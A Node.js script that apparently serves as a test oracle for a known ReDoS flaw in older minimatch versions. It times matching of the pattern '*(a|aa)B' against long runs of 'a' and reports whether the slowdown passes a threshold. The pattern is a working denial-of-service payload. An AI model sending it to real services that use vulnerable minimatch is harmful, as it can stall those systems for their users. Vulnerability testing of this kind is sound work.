const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function emit() {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
}

try {
  const minimatch = require('minimatch');

  const marker = path.join(os.tmpdir(), 'oracle-minimatch-redos-' + process.pid + '-' + Date.now());
  fs.mkdirSync(marker, { recursive: true });

  // Benign: verify normal API behavior first.
  const benignOk = minimatch('index.js', '*.js') === true;
  if (!benignOk) {
    throw new Error('benign minimatch failed');
  }

  operation_completed = true;

  // ReDoS trigger family for vulnerable minimatch (<3.0.5): nested extglob with long non-matching tail.
  // We run several bounded probes and use the worst elapsed time.
  const lengths = [2000, 4000, 8000, 12000];
  let worstMs = 0;
  const samples = [];

  for (const n of lengths) {
    const pattern = '*(a|aa)B';
    const input = 'a'.repeat(n);

    const t0 = process.hrtime.bigint();
    let result;
    try {
      result = minimatch(input, pattern);
    } catch (e) {
      // If patched behavior throws on this malicious pattern, exploit is blocked.
      exploit_succeeded = false;
      evidence = 'benign_ok; malicious_throw_at_n=' + n + '; msg=' + (e && e.message ? e.message : String(e));
      emit();
      return;
    }
    const ms = Number(process.hrtime.bigint() - t0) / 1e6;
    if (ms > worstMs) worstMs = ms;
    samples.push(n + ':' + ms.toFixed(3) + ':' + String(result));
  }

  // Threshold tuned to detect vulnerable pathological slowdown while staying bounded.
  const thresholdMs = 150;
  exploit_succeeded = worstMs >= thresholdMs;
  evidence = 'benign_ok; worst_ms=' + worstMs.toFixed(3) + '; threshold_ms=' + thresholdMs + '; samples=' + samples.join(',');
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failure=' + (err && err.message ? err.message : String(err));
}

emit();